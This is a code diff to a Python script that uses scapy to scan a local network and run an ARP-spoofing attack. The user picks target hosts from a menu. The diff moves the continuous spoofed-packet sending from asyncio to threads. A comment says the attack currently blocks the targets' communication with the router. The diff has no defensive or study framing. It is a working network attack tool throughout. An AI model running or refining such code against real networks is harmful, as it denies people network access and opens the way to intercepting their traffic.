@@ -6,7 +6,8 @@
 import scapy.all as scapy
 
 import os
-import asyncio
+# import asyncio # will not work because it doesnt use threads which is needed in this script
+import threading
 import subprocess
 import uuid
 import socket
@@ -127,12 +128,14 @@ class Data:
     Scan = True
     TargetedClients = []
     attack = False
+    threads = []
+    stopthreads = False
     
-async def ScanForever()->None:
+def ScanForever()->None:
     print("starting to scan")
     Data.clientsFound = Scanenetwork(0.5)
-    while Data.Scan:
-        items = Scanenetwork(5)
+    while Data.Scan and not Data.stopthreads:
+        items = Scanenetwork(5*2**(24-getsubnet() if getsubnet()<24 else 0))
         for ip,mac in items.items():
             Data.clientsFound[ip] = mac
 
@@ -145,25 +148,30 @@ def ask(q:str,possibleanswers:list) -> str:
             return output
         else:
             return ask(q,possibleanswers)
-async def Spoof(Targets:list=Data.TargetedClients)->None:
+def Spoof(Targets:list=Data.TargetedClients)->None:
     #currently just blocking the communication with the router
+    print("starts attacking")
+    Data.attack = True
     gateway = getDefaultGateway()
-    while Data.attack:
-        for ip,mac in Targets:
-            scapy.sendp(builtarppacket((ip,mac),(gateway,getmymac()),arptypes.isat))
-            print("sending")
-    print("attack stopped")
+    mymac = getmymac()
+    for ip,mac in Targets:
+        task = threading.Thread(target=sendspoofedpacket,args=(builtarppacket((ip,mac),(gateway,mymac),arptypes.isat)))
+        Data.threads.append(task)
+        task.start()
+def sendspoofedpacket(packet)->None:
+    while Data.attack and not Data.stopthreads:
+        scapy.sendp(packet,loop=False,verbose=False)
+        time.sleep(0.01)
     
     
 def StopAll()->None:
-    print(asyncio.Task.all_tasks())
     Data.attack=False
     Data.Scan=False
-    for task in asyncio.Task.all_tasks():
-        task.cancel()
+    Data.stopthreads=True
+    for task in Data.threads:
+        task.join()
         
 def menus(number:int|str=0)->None:
-    print(asyncio.Task.get_coro())
     #o display menus
     #1 display and pick clients to target
     
@@ -197,28 +205,32 @@ def menus(number:int|str=0)->None:
                 newtargets=Data.TargetedClients
             Data.TargetedClients = newtargets
             print(f"updated targets:{[x[0] for x in Data.TargetedClients]}")
-            Data.attack = True
-            asyncio.create_task(Spoof())
+            task = threading.Thread(target=Spoof,args=([Data.TargetedClients]))
+            Data.threads.append(task)
+            task.start()
     if str(pickedmenu) in menusdict.keys():
         menus(pickedmenu)
     else:
         if not str(pickedmenu).isnumeric():
             if str(pickedmenu).lower() in ["q","exit","quit"]:
                 print("goodbye")
+                StopAll()
                 return
         print(f"menu:{pickedmenu} is unavailable")
         menus(0)
     
     
-#@mainer
-async def main()->None:
+@mainer
+def main()->None:
     # scapy.sendp(builtarppacket((None,None),("192.168.16.20","aa:aa:aa:aa:aa:aa")))
         # print(Scanenetwork(2))
-        asyncio.create_task(ScanForever())
-        asyncio.create_task(menus())
-        StopAll()
+        task = threading.Thread(target=ScanForever)
+        Data.threads.append(task)
+        task.start()
+        menus()
         
         
         
-asyncio.run(main())
+        
+main()
 # print(getDefaultGateway())
